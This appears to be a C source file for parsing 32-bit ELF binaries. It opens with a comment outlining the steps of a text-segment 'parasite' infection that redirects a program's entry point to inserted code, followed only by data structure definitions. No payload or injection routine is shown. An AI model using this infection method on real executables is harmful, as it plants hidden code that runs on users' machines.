#include <stdio.h>
#include "/srv/kernel/linux-2.6.38.4/include/linux/elf.h"
//#include <elf.h>

/*
    * Increase e_shoff by PAGE_SIZE in the ELF header
    * Patch the insertion code (parasite) to jump to the entry point
      (original)
    * Locate the text segment program header
        * Modify the entry point of the ELF header to point to the new
          code (p_vaddr + p_filesz)
        * Increase p_filesz by account for the new code (parasite)
        * Increase p_memsz to account for the new code (parasite)
    * For each phdr who's segment is after the insertion (text segment)
        * increase p_offset by PAGE_SIZE
    * For the last shdr in the text segment
        * increase sh_len by the parasite length
    * For each shdr who's section resides after the insertion
        * Increase sh_offset by PAGE_SIZE
    * Physically insert the new code (parasite) and pad to PAGE_SIZE, into
      the file - text segment p_offset + p_filesz (original)
*/

#define ELF_PAGESIZE 4096

typedef struct _RawData {
    void *body;
    Elf32_Off offset;
    Elf32_Half size;
} RawData;

typedef enum {
    ElfEh, ElfSh, ElfPh, ElfSt, ElfDs
} ElfElementClass;
typedef struct _ElfElement {
    ElfElementClass class;

    union {
        Elf32_Shdr *sh;
        Elf32_Phdr *ph;
        Elf32_Sym  *st; /* Static Symbol Table */
        Elf32_Sym  *ds; /* Dynamic Symbol Table */
        //Elf32_Dyn  *dy;
    };

    char name[32];
    int index;
    Elf32_Half size;
    Elf32_Off offset;

    RawData *raw;

    struct _ElfElement *next;
    struct _ElfElement *last;
} ElfElement;

typedef struct _ElfObject {
    FILE *fD;
    Elf32_Off entry;
    Elf32_Half size;
    ElfElementClass class;

    Elf32_Ehdr *eh;

    int sh_count;
    ElfElement *sh;
    Elf32_Off sh_offset;

    int ph_count;
    ElfElement *ph;
    Elf32_Off ph_offset;

    int st_count;
    ElfElement *st;
    Elf32_Off st_offset;
    ElfElement *symtab;

    int ds_count;
    ElfElement *ds;
    Elf32_Off ds_offset;
    ElfElement *dynsym;

    int dy_count;
    ElfElement *dy;
    Elf32_Off dy_offset;
    ElfElement *dynamic;

    char *shstrtab;
    char *strtab;
    char *dynstr;
} ElfObject;
